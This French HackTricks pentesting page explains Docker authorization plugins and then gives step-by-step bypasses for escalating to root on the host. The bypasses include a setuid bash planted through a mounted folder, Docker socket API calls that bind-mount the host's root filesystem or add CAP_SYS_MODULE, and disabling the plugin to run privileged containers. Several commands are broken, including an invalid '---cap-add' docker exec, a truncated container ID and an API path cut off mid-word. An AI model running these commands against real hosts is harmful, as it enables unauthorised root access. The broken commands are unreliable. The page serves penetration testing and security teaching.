<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Le modèle d'**autorisation** par défaut de **Docker** est **tout ou rien**. Tout utilisateur ayant la permission d'accéder au démon Docker peut **exécuter n'importe quelle** commande du client Docker. Il en va de même pour les appelants utilisant l'API Engine de Docker pour contacter le démon. Si vous nécessitez un **contrôle d'accès plus poussé**, vous pouvez créer des **plugins d'autorisation** et les ajouter à votre configuration du démon Docker. En utilisant un plugin d'autorisation, un administrateur Docker peut **configurer des politiques d'accès granulaires** pour gérer l'accès au démon Docker.

# Architecture de base

Les plugins d'authentification Docker sont des **plugins externes** que vous pouvez utiliser pour **autoriser/refuser** les **actions** demandées au démon Docker **en fonction** de l'**utilisateur** qui l'a demandé et de l'**action** **demandée**.

Lorsqu'une **requête HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la requête au(x) **plugin(s) d'authentification** installé(s). La requête contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la requête.

Les diagrammes de séquence ci-dessous illustrent un flux d'autorisation d'autorisation et de refus :

![Flux d'autorisation Autoriser](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Flux d'autorisation Refuser](https://docs.docker.com/engine/extend/images/authz_deny.png)

Chaque requête envoyée au plugin **inclut l'utilisateur authentifié, les en-têtes HTTP et le corps de la requête/réponse**. Seuls le **nom d'utilisateur** et la **méthode d'authentification** utilisée sont transmis au plugin. Plus important encore, **aucune** **crédentielle** d'utilisateur ou token n'est transmis. Enfin, **tous les corps de requête/réponse ne sont pas envoyés** au plugin d'autorisation. Seuls ceux dont le `Content-Type` est soit `text/*` soit `application/json` sont envoyés.

Pour les commandes qui peuvent potentiellement détourner la connexion HTTP (`HTTP Upgrade`), telles que `exec`, le plugin d'autorisation n'est appelé que pour les requêtes HTTP initiales. Une fois que le plugin approuve la commande, l'autorisation n'est pas appliquée au reste du flux. En particulier, les données en streaming ne sont pas transmises aux plugins d'autorisation. Pour les commandes qui renvoient une réponse HTTP fragmentée, telles que `logs` et `events`, seule la requête HTTP est envoyée aux plugins d'autorisation.

Pendant le traitement de la requête/réponse, certains flux d'autorisation peuvent nécessiter des requêtes supplémentaires au démon Docker. Pour compléter de tels flux, les plugins peuvent appeler l'API du démon de la même manière qu'un utilisateur régulier. Pour permettre ces requêtes supplémentaires, le plugin doit fournir les moyens pour un administrateur de configurer des politiques d'authentification et de sécurité appropriées.

## Plusieurs Plugins

Vous êtes responsable de **l'enregistrement** de votre **plugin** dans le cadre du **démarrage** du démon Docker. Vous pouvez installer **plusieurs plugins et les chaîner ensemble**. Cette chaîne peut être ordonnée. Chaque requête au démon passe dans l'ordre à travers la chaîne. L'accès n'est accordé que lorsque **tous les plugins accordent l'accès** à la ressource.

# Exemples de Plugins

## Twistlock AuthZ Broker

Le plugin [**authz**](https://github.com/twistlock/authz) vous permet de créer un simple fichier **JSON** que le **plugin** lira pour autoriser les requêtes. Par conséquent, il vous donne la possibilité de contrôler très facilement quels points de terminaison de l'API peuvent atteindre chaque utilisateur.

Voici un exemple qui permettra à Alice et Bob de créer de nouveaux conteneurs : `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Sur la page [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go), vous pouvez trouver la relation entre l'URL demandée et l'action. Sur la page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go), vous pouvez trouver la relation entre le nom de l'action et l'action.

## Tutoriel Plugin Simple

Vous pouvez trouver un **plugin facile à comprendre** avec des informations détaillées sur l'installation et le débogage ici : [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lisez le `README` et le code `plugin.go` pour comprendre comment cela fonctionne.

# Contournement du Plugin d'Authentification Docker

## Enumérer l'accès

Les principales choses à vérifier sont **quels points de terminaison sont autorisés** et **quelles valeurs de HostConfig sont autorisées**.

Pour effectuer cette énumération, vous pouvez **utiliser l'outil** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## `run --privileged` interdit

### Privilèges Minimaux
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Exécution d'un conteneur puis obtention d'une session privilégiée

Dans ce cas, le sysadmin **a interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec l'option `--privileged`** ou de donner des capacités supplémentaires au conteneur :
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Cependant, un utilisateur peut **créer un shell à l'intérieur du conteneur en cours d'exécution et lui donner des privilèges supplémentaires** :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques précédemment discutées**](./#privileged-flag) et **élever ses privilèges** à l'intérieur de l'hôte.

## Monter un Dossier Modifiable

Dans ce cas, le sysadmin a **interdit aux utilisateurs d'exécuter des conteneurs avec l'option `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé le montage du dossier `/tmp` :
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Notez que vous ne pouvez peut-être pas monter le dossier `/tmp` mais vous pouvez monter un **dossier inscriptible différent**. Vous pouvez trouver des répertoires inscriptibles en utilisant : `find / -writable -type d 2>/dev/null`

**Notez que tous les répertoires d'une machine linux ne supporteront pas le bit suid !** Pour vérifier quels répertoires supportent le bit suid, exécutez `mount | grep -v "nosuid"`. Par exemple, généralement `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` et `/var/lib/lxcfs` ne supportent pas le bit suid.

Notez également que si vous pouvez **monter `/etc`** ou tout autre dossier **contenant des fichiers de configuration**, vous pouvez les modifier depuis le conteneur docker en tant que root afin de **les exploiter sur l'hôte** et escalader les privilèges (peut-être en modifiant `/etc/shadow`)
{% endhint %}

## Point de terminaison API non vérifié

La responsabilité de l'administrateur système configurant ce plugin serait de contrôler quelles actions et avec quels privilèges chaque utilisateur peut effectuer. Par conséquent, si l'administrateur adopte une approche de **liste noire** avec les points de terminaison et les attributs, il pourrait **en oublier certains** qui pourraient permettre à un attaquant d'**escalader les privilèges.**

Vous pouvez vérifier l'API docker sur [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Structure JSON non vérifiée

### Binds in root

Il est possible que lorsque l'administrateur système a configuré le pare-feu docker, il ait **oublié certains paramètres importants** de l'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) comme "**Binds**".\
Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur qui monte le dossier racine (/) de l'hôte :
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Notez que dans cet exemple, nous utilisons le paramètre **`Binds`** comme clé de niveau racine dans le JSON, mais dans l'API, il apparaît sous la clé **`HostConfig`**.
{% endhint %}

### Binds dans HostConfig

Suivez les mêmes instructions que pour **Binds à la racine** en effectuant cette **requête** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montages dans root

Suivez les mêmes instructions que pour **Binds in root** en effectuant cette **requête** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montages dans HostConfig

Suivez les mêmes instructions que pour **Binds in root** en effectuant cette **requête** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Attribut JSON non vérifié

Il est possible que lorsque le sysadmin a configuré le pare-feu docker, il a **oublié un attribut important d'un paramètre** de l'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) comme "**Capabilities**" à l'intérieur de "**HostConfig**". Dans l'exemple suivant, il est possible d'abuser de cette mauvaise configuration pour créer et exécuter un conteneur avec la capacité **SYS\_MODULE** :
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
La clé **`HostConfig`** contient généralement les **privilèges** **intéressants** pour s'échapper du conteneur. Cependant, comme nous l'avons déjà discuté, notez que l'utilisation de Binds en dehors de cela fonctionne également et peut vous permettre de contourner les restrictions.
{% endhint %}

## Désactivation du Plugin

Si le **sysadmin** a **oublié** d'**interdire** la capacité de **désactiver** le **plugin**, vous pouvez en profiter pour le désactiver complètement !
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
N'oubliez pas de **réactiver le plugin après l'escalade**, sinon un **redémarrage du service docker ne fonctionnera pas** !

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Références

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
